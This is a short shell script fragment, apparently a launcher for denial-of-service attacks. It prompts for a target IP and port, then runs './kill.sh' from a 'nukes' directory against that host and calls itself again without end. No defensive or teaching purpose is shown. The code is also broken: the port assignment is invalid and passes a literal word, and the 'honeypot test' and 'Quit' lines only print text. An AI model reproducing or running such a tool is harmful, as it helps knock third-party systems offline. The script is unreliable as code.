function dos()
{
echo "Enter The Target Ip"
read tIP
echo " "
echo "Enter Port To Connect"
read port
tport =" port"
echo "Testing For HoneyPot"

echo "Quit"

cd nukes && ./kill.sh $tIP $tport
dos
}

